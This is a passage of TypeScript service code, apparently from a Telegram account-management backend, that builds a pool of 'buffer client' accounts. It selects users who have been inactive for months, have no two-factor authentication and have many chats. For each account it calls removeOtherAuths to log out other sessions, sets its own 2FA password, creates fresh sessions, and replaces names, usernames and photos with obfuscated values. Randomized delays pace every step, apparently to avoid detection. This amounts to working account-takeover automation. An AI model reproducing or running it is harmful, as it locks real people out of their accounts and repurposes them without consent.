telegramClient = await connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });\n        try {\n            await sleep(5000 + Math.random() * 5000);\n            await telegramClient.updatePrivacyforDeletedAccount();\n            await this.update(doc.mobile, {\n                privacyUpdatedAt: new Date(),\n                lastUpdateAttempt: new Date(),\n                failedUpdateAttempts: 0,\n                lastUpdateFailure: null\n            });\n            this.logger.debug(`Updated privacy settings for ${doc.mobile}`);\n            await sleep(30000 + Math.random() * 20000);\n            return 1;\n        } catch (error: unknown) {\n            const errorDetails = this.handleError(error, 'Error updating privacy', doc.mobile);\n            await this.update(doc.mobile, {\n                lastUpdateAttempt: new Date(),\n                failedUpdateAttempts: failedAttempts + 1,\n                lastUpdateFailure: new Date()\n            });\n            if (isPermanentError(errorDetails)) {\n                await this.markAsInactive(doc.mobile, errorDetails.message);\n            }\n            return 0;\n        } finally {\n            await this.safeUnregisterClient(doc.mobile);\n        }\n    }\n\n    /**\n     * Delete profile photos for a buffer client\n     */\n    private async deleteProfilePhotos(doc: BufferClient, client: Client, failedAttempts: number): Promise<number> {\n        const telegramClient = await connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });\n        try {\n            await sleep(5000 + Math.random() * 5000);\n            const photos = await telegramClient.client.invoke(new Api.photos.GetUserPhotos({ userId: 'me', offset: 0 }));\n\n            if (photos.photos.length > 0) {\n                await telegramClient.deleteProfilePhotos();\n                this.logger.debug(`Deleted ${photos.photos.length} profile photos for ${doc.mobile}`);\n            } else {\n                this.logger.debug(`No profile photos to delete for ${doc.mobile}`);\n            }\n\n            await this.update(doc.mobile, {\n                profilePicsDeletedAt: new Date(),\n                lastUpdateAttempt: new Date(),\n                failedUpdateAttempts: 0,\n                lastUpdateFailure: null\n            });\n            await sleep(30000 + Math.random() * 20000);\n            return photos.photos.length > 0 ? 1 : 0;\n        } catch (error: unknown) {\n            const errorDetails = this.handleError(error, 'Error deleting photos', doc.mobile);\n            await this.update(doc.mobile, {\n                lastUpdateAttempt: new Date(),\n                failedUpdateAttempts: failedAttempts + 1,\n                lastUpdateFailure: new Date()\n            });\n            if (isPermanentError(errorDetails)) {\n                await this.markAsInactive(doc.mobile, errorDetails.message);\n            }\n            return 0;\n        } finally {\n            await this.safeUnregisterClient(doc.mobile);\n        }\n    }\n\n    /**\n     * Update name and bio for a buffer client\n     */\n    private async updateNameAndBio(doc: BufferClient, client: Client, failedAttempts: number): Promise<number> {\n        const telegramClient = await connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });\n        try {\n            await sleep(5000 + Math.random() * 5000);\n            const me = await telegramClient.getMe();\n            await sleep(5000 + Math.random() * 5000);\n\n            let updateCount = 0;\n            if (!isIncludedWithTolerance(safeAttemptReverse(me.firstName), client.name)) {\n                this.logger.log(`Updating name for ${doc.mobile} from ${me.firstName} to ${client.name}`);\n                await telegramClient.updateProfile(\n                    `${obfuscateText(client.name, {\n                        maintainFormatting: false,\n                        preserveCase: true,\n                        useInvisibleChars: false\n                    })} ${getCuteEmoji()}`,\n                    ''\n                );\n                updateCount = 1;\n            }\n\n            await this.update(doc.mobile, {\n                nameBioUpdatedAt: new Date(),\n                lastUpdateAttempt: new Date(),\n                failedUpdateAttempts: 0,\n                lastUpdateFailure: null\n            });\n            this.logger.debug(`Updated name and bio for ${doc.mobile}`);\n            await sleep(30000 + Math.random() * 20000);\n            return updateCount;\n        } catch (error: unknown) {\n            const errorDetails = this.handleError(error, 'Error updating profile', doc.mobile);\n            await this.update(doc.mobile, {\n                lastUpdateAttempt: new Date(),\n                failedUpdateAttempts: failedAttempts + 1,\n                lastUpdateFailure: new Date()\n            });\n            if (isPermanentError(errorDetails)) {\n                await this.markAsInactive(doc.mobile, errorDetails.message);\n            }\n            return 0;\n        } finally {\n            await this.safeUnregisterClient(doc.mobile);\n        }\n    }\n\n    /**\n     * Update username for a buffer client\n     */\n    private async updateUsername(doc: BufferClient, client: Client, failedAttempts: number): Promise<number> {\n        const telegramClient = await connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });\n        try {\n            await sleep(5000 + Math.random() * 5000);\n            const me = await telegramClient.getMe();\n            await sleep(5000 + Math.random() * 5000);\n            await this.telegramService.updateUsernameForAClient(doc.mobile, client.clientId, client.name, me.username);\n            await this.update(doc.mobile, {\n                usernameUpdatedAt: new Date(),\n                lastUpdateAttempt: new Date(),\n                failedUpdateAttempts: 0,\n                lastUpdateFailure: null\n            });\n            this.logger.debug(`Updated username for ${doc.mobile}`);\n            await sleep(30000 + Math.random() * 20000);\n            return 1;\n        } catch (error: unknown) {\n            const errorDetails = this.handleError(error, 'Error updating username', doc.mobile);\n            await this.update(doc.mobile, {\n                lastUpdateAttempt: new Date(),\n                failedUpdateAttempts: failedAttempts + 1,\n                lastUpdateFailure: new Date()\n            });\n            if (isPermanentError(errorDetails)) {\n                await this.markAsInactive(doc.mobile, errorDetails.message);\n            }\n            return 0;\n        } finally {\n            await this.safeUnregisterClient(doc.mobile);\n        }\n    }\n\n    /**\n     * Update profile photos for a buffer client\n     */\n    private async updateProfilePhotos(doc: BufferClient, client: Client, failedAttempts: number): Promise<number> {\n        const telegramClient = await connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });\n        try {\n            await sleep(5000 + Math.random() * 5000);\n            const photos = await telegramClient.client.invoke(new Api.photos.GetUserPhotos({ userId: 'me', offset: 0 }));\n\n            let updateCount = 0;\n            if (photos.photos.length < 2) {\n                await CloudinaryService.getInstance(client?.dbcoll?.toLowerCase());\n                await sleep(10000 + Math.random() * 5000);\n\n                const photoPaths = ['dp1.jpg', 'dp2.jpg', 'dp3.jpg'];\n                const randomPhoto = photoPaths[Math.floor(Math.random() * photoPaths.length)];\n                await telegramClient.updateProfilePic(path.join(process.cwd(), randomPhoto));\n                updateCount = 1;\n                this.logger.debug(`Updated profile photo ${randomPhoto} for ${doc.mobile}`);\n            }\n\n            await this.update(doc.mobile, {\n                profilePicsUpdatedAt: new Date(),\n                lastUpdateAttempt: new Date(),\n                failedUpdateAttempts: 0,\n                lastUpdateFailure: null\n            });\n            await sleep(40000 + Math.random() * 20000);\n            return updateCount;\n        } catch (error: unknown) {\n            const errorDetails = this.handleError(error, 'Error updating profile photos', doc.mobile);\n            await this.update(doc.mobile, {\n                lastUpdateAttempt: new Date(),\n                failedUpdateAttempts: failedAttempts + 1,\n                lastUpdateFailure: new Date()\n            });\n            if (isPermanentError(errorDetails)) {\n                await this.markAsInactive(doc.mobile, errorDetails.message);\n            }\n            return 0;\n        } finally {\n            await this.safeUnregisterClient(doc.mobile);\n        }\n    }\n\n    /**\n     * Process buffer client updates in priority order\n     * Handles privacy, photos, name/bio, username, and profile photos updates\n     */\n    async processBufferClient(doc: BufferClient, client: Client): Promise<number> {\n        if (doc.inUse === true) {\n            this.logger.debug(`Buffer client ${doc.mobile} is marked as in use`);\n            return 0;\n        }\n\n        if (!client) {\n            this.logger.warn(`Client not found for buffer client ${doc.mobile}`);\n            return 0;\n        }\n\n        const MIN_COOLDOWN_HOURS = 2;\n        const MAX_FAILED_ATTEMPTS = 3;\n        const FAILURE_RESET_DAYS = 7;\n        const now = Date.now();\n        let updateCount = 0;\n\n        try {\n            await sleep(15000 + Math.random() * 10000); // 15-25s initial delay\n\n            // Check if client has too many failed attempts\n            const failedAttempts = doc.failedUpdateAttempts || 0;\n            const lastFailureTime = ClientHelperUtils.getTimestamp(doc.lastUpdateFailure);\n\n            // Reset failure count if last failure was more than FAILURE_RESET_DAYS ago\n            if (failedAttempts > 0 && lastFailureTime > 0 && now - lastFailureTime > FAILURE_RESET_DAYS * this.ONE_DAY_MS) {\n                this.logger.log(`Resetting failure count for ${doc.mobile} (last failure was ${Math.floor((now - lastFailureTime) / this.ONE_DAY_MS)} days ago)`);\n                await this.update(doc.mobile, {\n                    failedUpdateAttempts: 0,\n                    lastUpdateFailure: null\n                });\n            } else if (failedAttempts >= MAX_FAILED_ATTEMPTS) {\n                this.logger.warn(`Skipping ${doc.mobile} - too many failed attempts (${failedAttempts}). Will retry after ${FAILURE_RESET_DAYS} days.`);\n                return 0;\n            }\n\n            // Check cooldown\n            const lastUpdateAttempt = ClientHelperUtils.getTimestamp(doc.lastUpdateAttempt);\n            if (lastUpdateAttempt > 0 && now - lastUpdateAttempt < MIN_COOLDOWN_HOURS * 60 * 60 * 1000) {\n                const hoursRemaining = ((MIN_COOLDOWN_HOURS * 60 * 60 * 1000) - (now - lastUpdateAttempt)) / (60 * 60 * 1000);\n                this.logger.debug(`Client ${doc.mobile} on cooldown, ${hoursRemaining.toFixed(1)} hours remaining`);\n                return 0;\n            }\n\n            // Check if recently used\n            const lastUsed = ClientHelperUtils.getTimestamp(doc.lastUsed);\n            if (lastUsed > 0 && now - lastUsed < MIN_COOLDOWN_HOURS * 60 * 60 * 1000) {\n                this.logger.debug(`Client ${doc.mobile} recently used, skipping`);\n                return 0;\n            }\n\n            // Backfill timestamps for used clients\n            if (lastUsed > 0) {\n                await this.backfillTimestamps(doc.mobile, doc, now);\n                this.logger.debug(`Client ${doc.mobile} has been used, assuming configured`);\n                return 0;\n            }\n\n            // Check pending updates\n            const pendingUpdates = this.getPendingUpdates(doc, now);\n            if (pendingUpdates.totalPending > 0) {\n                this.logger.debug(`Client ${doc.mobile} has ${pendingUpdates.totalPending} pending updates: ${pendingUpdates.reasons.join(', ')}`);\n            } else {\n                this.logger.debug(`Client ${doc.mobile} has no pending updates - all complete!`);\n            }\n\n            // PRIORITY 1: Privacy update\n            if (pendingUpdates.needsPrivacy) {\n                updateCount = await this.updatePrivacySettings(doc, client, failedAttempts);\n                return updateCount;\n            }\n\n            // PRIORITY 2: Delete profile photos\n            if (pendingUpdates.needsDeletePhotos) {\n                updateCount = await this.deleteProfilePhotos(doc, client, failedAttempts);\n                return updateCount;\n            }\n\n            // PRIORITY 3: Update name and bio\n            if (pendingUpdates.needsNameBio) {\n                updateCount = await this.updateNameAndBio(doc, client, failedAttempts);\n                return updateCount;\n            }\n\n            // PRIORITY 4: Update username\n            if (pendingUpdates.needsUsername) {\n                updateCount = await this.updateUsername(doc, client, failedAttempts);\n                return updateCount;\n            }\n\n            // PRIORITY 5: Add profile photos\n            if (pendingUpdates.needsProfilePhotos) {\n                updateCount = await this.updateProfilePhotos(doc, client, failedAttempts);\n                return updateCount;\n            }\n\n            // Track attempt even if no updates performed\n            if (updateCount === 0) {\n                await this.update(doc.mobile, { lastUpdateAttempt: new Date() });\n                if (pendingUpdates.totalPending > 0) {\n                    this.logger.debug(`No updates performed for ${doc.mobile} despite ${pendingUpdates.totalPending} pending. Reasons: ${pendingUpdates.reasons.join(', ')}`);\n                }\n            } else {\n                const remainingPending = pendingUpdates.totalPending - updateCount;\n                if (remainingPending > 0) {\n                    this.logger.debug(`Client ${doc.mobile} still has ${remainingPending} pending updates`);\n                } else {\n                    this.logger.log(` Client ${doc.mobile} - ALL UPDATES COMPLETE!`);\n                }\n            }\n\n            return updateCount;\n        } catch (error: unknown) {\n            const errorDetails = this.handleError(error, 'Error with client', doc.mobile);\n            try {\n                const failedAttempts = doc.failedUpdateAttempts || 0;\n                await this.update(doc.mobile, {\n                    lastUpdateAttempt: new Date(),\n                    failedUpdateAttempts: failedAttempts + 1,\n                    lastUpdateFailure: new Date()\n                });\n            } catch (updateError) {\n                this.logger.warn(`Failed to track update attempt for ${doc.mobile}:`, updateError);\n            }\n            if (isPermanentError(errorDetails)) {\n                await this.markAsInactive(doc.mobile, errorDetails.message);\n            }\n            return 0;\n        } finally {\n            await sleep(15000 + Math.random() * 10000);\n        }\n    }\n\n    /**\n     * Create a buffer client from a user document\n     * @param document - User document with mobile and tgId\n     * @param targetClientId - Client ID to assign the buffer client to\n     * @param availableDate - Optional availableDate (defaults to today for immediate availability)\n     * @returns true if created successfully, false otherwise\n     */\n    private async createBufferClientFromUser(\n        document: { mobile: string; tgId: string },\n        targetClientId: string,\n        availableDate?: string // Optional - defaults to today\n    ): Promise<boolean> {\n        const telegramClient = await connectionManager.getClient(document.mobile, {\n            autoDisconnect: false,\n        });\n\n        try {\n            // Check password\n            const hasPassword = await telegramClient.hasPassword();\n            this.logger.debug(`hasPassword for ${document.mobile}: ${hasPassword}`);\n\n            if (hasPassword) {\n                this.logger.debug(`Failed to Update as BufferClient as ${document.mobile} already has Password`);\n                await this.updateUser2FAStatus(document.tgId, document.mobile);\n                return false;\n            }\n\n            // Setup 2FA\n            await telegramClient.removeOtherAuths();\n            await sleep(10000 + Math.random() * 10000);\n            await telegramClient.set2fa();\n            this.logger.debug('Waiting for setting 2FA');\n            await sleep(30000 + Math.random() * 30000);\n\n            // Get channel info and create session\n            const channels = await this.telegramService.getChannelInfo(document.mobile, true);\n            await sleep(5000 + Math.random() * 5000);\n            const newSession = await this.telegramService.createNewSession(document.mobile);\n\n            // Use provided availableDate or default to today\n            const targetAvailableDate = availableDate || ClientHelperUtils.getTodayDateString();\n            this.logger.debug(`Inserting Document for client ${targetClientId} with availableDate ${targetAvailableDate}`);\n\n            const bufferClient: CreateBufferClientDto = {\n                tgId: document.tgId,\n                session: newSession,\n                mobile: document.mobile,\n                lastUsed: null,\n                availableDate: targetAvailableDate,\n                channels: channels.ids.length,\n                clientId: targetClientId,\n                status: 'active',\n                message: availableDate\n                    ? 'Account successfully configured as buffer client - available immediately'\n                    : 'Account successfully configured as buffer client',\n            };\n\n            await this.create(bufferClient);\n            await this.updateUser2FAStatus(document.tgId, document.mobile);\n            this.logger.log(`Created BufferClient for ${targetClientId} with availability ${targetAvailableDate}`);\n            return true;\n        } catch (error: unknown) {\n            const errorDetails = this.handleError(error, 'Error processing client', document.mobile);\n            this.logger.error(`Error processing buffer client ${document.mobile}: ${errorDetails.message}`);\n            if (isPermanentError(errorDetails)) {\n                try {\n                    await this.markAsInactive(document.mobile, errorDetails.message);\n                } catch (markError) {\n                    this.logger.error(`Failed to mark ${document.mobile} as inactive:`, markError);\n                }\n            }\n            return false;\n        } finally {\n            await this.safeUnregisterClient(document.mobile);\n            await sleep(10000 + Math.random() * 5000);\n        }\n    }\n\n    /**\n     * Add new users to buffer clients pool\n     * Legacy method - now uses dynamic availability-based calculation internally\n     * Maintains backward compatibility with existing API calls\n     * \n     * @param badIds - Mobile numbers to exclude from selection\n     * @param goodIds - Mobile numbers already in use (active clients, promote clients, assigned buffer clients)\n     * @param clientsNeedingBufferClients - Array of client IDs that need more buffer clients\n     * @param bufferClientsPerClient - Optional map of current buffer client counts per client\n     */\n    async addNewUserstoBufferClients(\n        badIds: string[],\n        goodIds: string[],\n        clientsNeedingBufferClients: string[] = [],\n        bufferClientsPerClient?: Map<string, number>,\n    ) {\n        // Convert legacy format to dynamic format\n        const clientNeedingBufferClientsDynamic: Array<{\n            clientId: string;\n            totalNeeded: number;\n            windowNeeds: Array<{ window: string; available: number; needed: number; targetDate: string; minRequired: number }>;\n            totalActive: number;\n            totalNeededForCount: number;\n            calculationReason: string;\n            priority: number;\n        }> = [];\n\n        // Calculate needs for each client using dynamic calculation\n        for (const clientId of clientsNeedingBufferClients) {\n            const availabilityNeeds = await this.calculateAvailabilityBasedNeeds(clientId);\n            if (availabilityNeeds.totalNeeded > 0) {\n                clientNeedingBufferClientsDynamic.push({\n                    clientId,\n                    ...availabilityNeeds\n                });\n            }\n        }\n\n        // Sort by priority (most urgent first)\n        clientNeedingBufferClientsDynamic.sort((a, b) => a.priority - b.priority);\n\n        // Call dynamic method\n        await this.addNewUserstoBufferClientsDynamic(\n            badIds,\n            goodIds,\n            clientNeedingBufferClientsDynamic,\n            bufferClientsPerClient\n        );\n    }\n\n    /**\n     * Add new users to buffer clients pool using dynamic availability-based assignment\n     * All new buffer clients get availableDate = today (available immediately)\n     * Prioritizes by urgency (today > tomorrow > 1 week > 10 days > count only)\n     * \n     * @param badIds - Mobile numbers to exclude from selection\n     * @param goodIds - Mobile numbers already in use (active clients, promote clients, assigned buffer clients)\n     * @param clientsNeedingBufferClients - Array of client needs with priority and window details\n     * @param bufferClientsPerClient - Optional map of current buffer client counts per client (for reference)\n     */\n    async addNewUserstoBufferClientsDynamic(\n        badIds: string[],\n        goodIds: string[],\n        clientsNeedingBufferClients: Array<{\n            clientId: string;\n            totalNeeded: number;\n            windowNeeds: Array<{ window: string; available: number; needed: number; targetDate: string; minRequired: number }>;\n            totalActive: number;\n            totalNeededForCount: number;\n            calculationReason: string;\n            priority: number;\n        }>,\n        bufferClientsPerClient?: Map<string, number>,\n    ) {\n        const threeMonthsAgo = ClientHelperUtils.getDateStringDaysAgo(this.INACTIVE_USER_CUTOFF_DAYS, this.ONE_DAY_MS);\n\n        // Calculate total needed (already sorted by priority)\n        let totalNeeded = 0;\n        for (const clientNeed of clientsNeedingBufferClients) {\n            totalNeeded += clientNeed.totalNeeded;\n        }\n        // Only global rate limit applies\n        totalNeeded = Math.min(totalNeeded, this.MAX_NEW_BUFFER_CLIENTS_PER_TRIGGER);\n\n        if (totalNeeded === 0) {\n            this.logger.debug('No buffer clients needed - all availability windows and total count satisfied');\n            return;\n        }\n\n        this.logger.debug(\n            `Creating ${totalNeeded} new buffer clients (all with availableDate = today) ` +\n            `to satisfy availability windows and total count requirements`\n        );\n\n        // Fetch candidate users\n        const documents = await this.usersService.executeQuery(\n            {\n                mobile: { $nin: goodIds },\n                expired: false,\n                twoFA: false,\n                lastActive: { $lt: threeMonthsAgo },\n                totalChats: { $gt: 150 },\n            },\n            { tgId: 1 },\n            totalNeeded + 5, // Buffer for failures\n        );\n\n        // Create assignment queue - prioritize by client priority (already sorted)\n        // All new clients get availableDate = today\n        const today = new Date().toISOString().split('T')[0];\n        const assignmentQueue: Array<{\n            clientId: string;\n            priority: number;\n        }> = [];\n\n        for (const clientNeed of clientsNeedingBufferClients) {\n            // Create assignments for each needed buffer client\n            // All get availableDate = today (they'll be available immediately)\n            for (let i = 0; i < clientNeed.totalNeeded; i++) {\n                assignmentQueue.push({\n                    clientId: clientNeed.clientId,\n                    priority: clientNeed.priority\n                });\n            }\n        }\n\n        let processedCount = 0;\n        let assignmentIndex = 0;\n\n        while (\n            processedCount < totalNeeded &&\n            documents.length > 0 &&\n            assignmentIndex < assignmentQueue.length\n        ) {\n            const document = documents.shift();\n            if (!document || !document.mobile || !document.tgId) {\n                this.logger.warn('Invalid document found, skipping');\n                continue;\n            }\n\n            const assignment = assignmentQueue[assignmentIndex];\n            if (!assignment) {\n                this.logger.debug('No more assignments needed');\n                break;\n            }\n\n            try {\n                // All new buffer clients get availableDate = today\n                const created = await this.createBufferClientFromUser(\n                    document,\n                    assignment.clientId,\n                    today // Always today - they'll be available immediately\n                );\n\n                if (created) {\n                    assignmentIndex++;\n                    processedCount++;\n                    this.logger.debug(\n                        `Created buffer client ${document.mobile} for ${assignment.clientId} ` +\n                        `with availableDate = ${today} (available immediately, priority: ${assignment.priority})`\n                    );\n                } else {\n                    processedCount++; // Failed but increment to avoid infinite loop\n                }\n            } catch (error: unknown) {\n                const errorDetails = this.handleError(error, 'Error creating client connection', document.mobile);\n                this.logger.error(`Error creating connection for ${document.mobile}:`, errorDetails);\n                await sleep(10000 + Math.random() * 5000);\n                processedCount++;\n            }\n        }\n\n        this.logger.log(\n            ` Dynamic batch completed: Created ${processedCount} new buffer clients ` +\n            `(all with availableDate = ${today}, available immediately). ` +\n            `System maintains availability windows and total count requirements.`\n        );\n    }\n\n    async updateAllClientSessions() {\n        const bufferClients = await this.findAll('active');\n        for (let i = 0; i < bufferClients.length; i++) {\n            const bufferClient = bufferClients[i];\n            try {\n                this.logger.log(`Creating new session for mobile: ${bufferClient.mobile} (${i + 1}/${bufferClients.length})`);\n                const client = await connectionManager.getClient(bufferClient.mobile, {\n                    autoDisconnect: false,\n                    handler: true,\n                });\n                try {\n                    const hasPassword = await client.hasPassword();\n                    if (!hasPassword) {\n                        await client.removeOtherAuths();\n                        await sleep(20000 + Math.random() * 10000); // 20-30s delay\n                        await client.set2fa();\n                        await sleep(60000 + Math.random() * 30000); // 60-90s delay for 2FA setup\n                    }\n                    await sleep(5000 + Math.random() * 5000); // Delay before session creation\n                    const newSession = await this.telegramService.createNewSession(bufferClient.mobile);\n                    await this.update(bufferClient.mobile, {\n                        session: newSession,\n                        lastUsed: null,\n                        message: 'Session updated successfully',\n                    });\n                } catch (error: unknown) {\n                    const errorDetails = this.handleError(error, 'Failed to create new session', bufferClient.mobile);\n                    if (isPermanentError(errorDetails)) {\n                        await this.update(bufferClient.mobile, {\n                            status: 'inactive',\n                            message: `Session update failed: ${errorDetails.message}`,\n                        });\n                    }\n                } finally {\n                    await this.safeUnregisterClient(bufferClient.mobile);\n                    // Progressive delay between clients to prevent rate limits\n                    if (i < bufferClients.length - 1) {\n                        await sleep(15000 + Math.random() * 10000); // 15-25s delay between clients\n                    }\n                }\n            } catch (error: unknown) {\n                const errorDetails = this.handleError(error, 'Error creating client connection', bufferClient.mobile);\n                this.logger.error(`Error creating client connection for ${bufferClient.mobile}: ${errorDetails.message}`);\n                // Add delay even on error\n                if (i < bufferClients.length - 1) {\n                    await sleep(15000 + Math.random() * 10000);\n                }\n            }\n        }\n    }\n\n    async getBufferClientsByClientId(clientId: string, status?: string): Promise<BufferClientDocument[]> {\n        const filter: Record<string, any> = { clientId };\n        if (status) {\n            filter.status = status;\n        }\n        return this.bufferClientModel.find(filter).exec();\n    }\n\n    async getBufferClientDistribution(): Promise<{\n        totalBufferClients: number;\n        unassignedBufferClients: number;\n        activeBufferClients: number;\n        inactiveBufferClients: number;\n        distributionPerClient: Array<{\n            clientId: string;\n            assignedCount: number;\n            activeCount: number;\n            inactiveCount: number;\n            needed: number;\n            status: 'sufficient' | 'needs_more';\n            neverUsed: number;\n            usedInLast24Hours: number;\n        }>;\n        summary: {\n            clientsWithSufficientBufferClients: number;\n            clientsNeedingBufferClients: number;\n            totalBufferClientsNeeded: number;\n            maxBufferClientsPerTrigger: number;\n            triggersNeededToSatisfyAll: number;\n        };\n    }> {\n        const clients = await this.clientService.findAll();\n        const now = new Date();\n        const last24Hours = new Date(now.getTime() - this.ONE_DAY_MS);\n\n        const [\n            totalBufferClients,\n            unassignedBufferClients,\n            activeBufferClients,\n            inactiveBufferClients,\n            assignedCounts,\n            activeCounts,\n            inactiveCounts,\n            neverUsedCounts,\n            recentlyUsedCounts,\n        ] = await Promise.all([\n            this.bufferClientModel.countDocuments(),\n            this.bufferClientModel.countDocuments({ clientId: { $exists: false } }),\n            this.bufferClientModel.countDocuments({ status: 'active' }),\n            this.bufferClientModel.countDocuments({ status: 'inactive' }),\n            this.bufferClientModel.aggregate([\n                { $match: { clientId: { $exists: true, $ne: null } } },\n                { $group: { _id: '$clientId', count: { $sum: 1 } } },\n            ]),\n            this.bufferClientModel.aggregate([\n                { $match: { clientId: { $exists: true, $ne: null }, status: 'active' } },\n                { $group: { _id: '$clientId', count: { $sum: 1 } } },\n            ]),\n            this.bufferClientModel.aggregate([\n                { $match: { clientId: { $exists: true, $ne: null }, status: 'inactive' } },\n                { $group: { _id: '$clientId', count: { $sum: 1 } } },\n            ]),\n            this.bufferClientModel.aggregate([\n                {\n                    $match: {\n                        clientId: { $exists: true, $ne: null },\n                        status: 'active',\n                        $or: [{ lastUsed: { $exists: false } }, { lastUsed: null }],\n                    },\n                },\n                { $group: { _id: '$clientId', count: { $sum: 1 } } },\n            ]),\n            this.bufferClientModel.aggregate([\n                {\n                    $match: {\n                        clientId: { $exists: true, $ne: null },\n                        status: 'active',\n                        lastUsed: { $gte: last24Hours },\n                    },\n                },\n                { $group: { _id: '$clientId', count: { $sum: 1 } } },\n            ]),\n        ]);\n\n        const assignedCountMap = new Map(assignedCounts.map((item: { _id: string; count: number }) => [item._id, item.count]));\n        const activeCountMap = new Map(activeCounts.map((item: { _id: string; count: number }) => [item._id, item.count]));\n        const inactiveCountMap = new Map(inactiveCounts.map((item: { _id: string; count: number }) => [item._id, item.count]));\n        const neverUsedCountMap = new Map(neverUsedCounts.map((item: { _id: string; count: number }) => [item._id, item.count]));\n        const recentlyUsedCountMap = new Map(recentlyUsedCounts.map((item: { _id: string; count: number }) => [item._id, item.count]));\n\n        const distributionPerClient = [];\n        let clientsWithSufficient = 0;\n        let clientsNeedingMore = 0;\n        let totalNeeded = 0;\n\n        for (const client of clients) {\n            const assignedCount = assignedCountMap.get(client.clientId) || 0;\n            const activeCount = activeCountMap.get(client.clientId) || 0;\n            const inactiveCount = inactiveCountMap.get(client.clientId) || 0;\n            const neverUsed = neverUsedCountMap.get(client.clientId) || 0;\n            const usedInLast24Hours = recentlyUsedCountMap.get(client.clientId) || 0;\n            const needed = Math.max(0, this.MIN_TOTAL_BUFFER_CLIENTS - activeCount);\n            const status = needed === 0 ? 'sufficient' : 'needs_more';\n\n            distributionPerClient.push({\n                clientId: client.clientId,\n                assignedCount,\n                activeCount,\n                inactiveCount,\n                needed,\n                status,\n                neverUsed,\n                usedInLast24Hours,\n            });\n\n            if (status === 'sufficient') {\n                clientsWithSufficient++;\n            } else {\n                clientsNeedingMore++;\n                totalNeeded += needed;\n            }\n        }\n\n        const maxPerTrigger = this.MAX_NEW_BUFFER_CLIENTS_PER_TRIGGER;\n        const triggersNeeded = Math.ceil(totalNeeded / maxPerTrigger);\n\n        return {\n            totalBufferClients,\n            unassignedBufferClients,\n            activeBufferClients,\n            inactiveBufferClients,\n            distributionPerClient,\n            summary: {\n                clientsWithSufficientBufferClients: clientsWithSufficient,\n                clientsNeedingBufferClients: clientsNeedingMore,\n                totalBufferClientsNeeded: totalNeeded,\n                maxBufferClientsPerTrigger: maxPerTrigger,\n                triggersNeededToSatisfyAll: triggersNeeded,\n            },\n        };\n    }\n\n    async getBufferClientsByStatus(status: string): Promise<BufferClient[]> {\n        return this.bufferClientModel.find({ status }).exec();\n    }\n\n    async getBufferClientsWithMessages(): Promise<\n        Array<{\n            mobile: string;\n            status: string;\n            message: string;\n            clientId?: string;\n            lastUsed?: Date;\n        }>\n    > {\n        return this.bufferClientModel\n            .find({}, { mobile: 1, status: 1, message: 1, clientId: 1, lastUsed: 1 })\n            .exec();\n    }\n\n    async getLeastRecentlyUsedBufferClients(clientId: string, limit: number = 1): Promise<BufferClient[]> {\n        return this.bufferClientModel\n            .find({\n                clientId,\n                status: 'active',\n                inUse: { $ne: true } // Exclude clients currently in use\n            })\n            .sort({ lastUsed: 1, _id: 1 })\n            .limit(limit)\n            .exec();\n    }\n\n    async getNextAvailableBufferClient(clientId: string): Promise<BufferClientDocument | null> {\n        const clients = await this.getLeastRecentlyUsedBufferClients(clientId, 1);\n        return clients.length > 0 ? clients[0] as BufferClientDocument : null;\n    }\n\n    async getUnusedBufferClients(hoursAgo: number = 24, clientId?: string): Promise<BufferClientDocument[]> {\n        const cutoffDate = new Date(Date.now() - hoursAgo * 60 * 60 * 1000);\n        const filter: Record<string, any> = {\n            status: 'active',\n            inUse: { $ne: true }, // Exclude clients currently in use\n            $or: [\n                { lastUsed: { $lt: cutoffDate } },\n                { lastUsed: { $exists: false } },\n                { lastUsed: null },\n            ],\n        };\n\n        if (clientId) {\n            filter.clientId = clientId;\n        }\n\n        return this.bufferClientModel.find(filter).exec();\n    }\n\n    async getUsageStatistics(clientId?: string): Promise<{\n        totalClients: number;\n        neverUsed: number;\n        usedInLast24Hours: number;\n        usedInLastWeek: number;\n        averageUsageGap: number;\n    }> {\n        const filter: Record<string, any> = { status: 'active' };\n        if (clientId) {\n            filter.clientId = clientId;\n        }\n\n        const now = new Date();\n        const last24Hours = new Date(now.getTime() - this.ONE_DAY_MS);\n        const lastWeek = new Date(now.getTime() - 7 * this.ONE_DAY_MS);\n\n        const [\n            totalClients,\n            neverUsed,\n            usedInLast24Hours,\n            usedInLastWeek,\n            allClients,\n        ] = await Promise.all([\n            this.bufferClientModel.countDocuments(filter),\n            this.bufferClientModel.countDocuments({\n                ...filter,\n                $or: [{ lastUsed: { $exists: false } }, { lastUsed: null }],\n            }),\n            this.bufferClientModel.countDocuments({\n                ...filter,\n                lastUsed: { $gte: last24Hours },\n            }),\n            this.bufferClientModel.countDocuments({\n                ...filter,\n                lastUsed: { $gte: lastWeek },\n            }),\n            this.bufferClientModel.find(filter, { lastUsed: 1, createdAt: 1 }).exec(),\n        ]);\n\n        let totalGap = 0;\n        let gapCount = 0;\n\n        for (const client of allClients) {\n            if (client.lastUsed) {\n                const gap = now.getTime() - new Date(client.lastUsed).getTime();\n                totalGap += gap;\n                gapCount++;\n            }\n        }\n\n        const averageUsageGap = gapCount > 0 ? totalGap / gapCount / (60 * 60 * 1000) : 0;\n\n        return {\n            totalClients,\n            neverUsed,\n            usedInLast24Hours,\n            usedInLastWeek,\n            averageUsageGap,\n        };\n    }\n\n    async markAsUsed(mobile: string, message?: string): Promise<BufferClientDocument> {\n        const updateData: UpdateBufferClientDto = { lastUsed: new Date() };\n        if (message) {\n            updateData.message = message;\n        }\n\n        return this.update(mobile, updateData);\n    }\n}","import { ApiProperty } from '@nestjs/swagger';\nimport {  IsDateString, IsNumber, IsOptional, IsString } from 'class-validator';\n\nexport class CreateBufferClientDto {\n  @ApiProperty({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsString()\n  readonly tgId: string;\n\n  @ApiProperty({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsString()\n  readonly mobile: string;\n\n  @ApiProperty({\n    description: 'Date of the session',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly availableDate: string;\n\n  @ApiProperty({\n    description: 'Session identifier',\n    example: 'session123',\n  })\n  @IsString()\n  readonly session: string;\n\n  @ApiProperty({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels: number;\n\n  @ApiProperty({\n    description: 'Client ID that this buffer client belongs 